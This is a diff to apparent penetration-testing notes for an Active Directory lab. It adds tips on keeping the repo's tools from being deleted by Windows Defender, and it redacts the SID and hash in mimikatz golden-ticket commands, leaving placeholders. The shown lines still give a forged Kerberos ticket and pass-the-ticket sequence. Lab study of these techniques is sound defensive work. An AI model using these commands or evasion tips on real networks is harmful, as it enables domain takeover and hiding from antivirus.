@@ -23,6 +23,12 @@
 // > bat2exe > https://github.com/islamadel/bat2exe/releases/download/2.1/bat2exe.exe > "access denied error"
 // > bat to exe converter > https://bat-to-exe-converter-x64.en.softonic.com/ > should work (make sure to use the 64bit exe-format)
 
+2.5) important for the files in this repo:
+> all files get deleted by defender if downloaded directly on the VM
+> all files survive if they get drag and dropped into the VM from the host machine
+> the .exe file gets deleted after a minute or so (the same with the use of a shared folder)
+> so for the .exe file it's better to create your own with "bat to exe converter" 
+
 3) commands
 > whoami (check current user in terminal)
 > dir (list directory contents)
@@ -223,10 +229,10 @@ ________________________________________________________________________________
 > open a normal cmd windows
 > whoami /user (copy SID except last 4 digits)
 > go to mimikatz
-> kerberos::golden /domain:adlab.local /sid:S-1-5-21-3704816349-2630934885-840893638 /rc4:cc326e8519157da4bf8ef543b8680dc3 /user:abcdef /id:500 /ptt
+> kerberos::golden /domain:adlab.local /sid:xxx /rc4:xxx /user:xxx /id:500 /ptt
 
 > or.. save for later:
-> kerberos::golden /domain:adlab.local /sid:S-1-5-21-3704816349-2630934885-840893638 /rc4:cc326e8519157da4bf8ef543b8680dc3 /user:abcdef /id:500 /ptt
+> kerberos::golden /domain:adlab.local /sid:xxx /rc4:xxx /user:xxx /id:500 /ptt
 > kerberos::ptt ticket.kirbi
 > misc::cmd
 
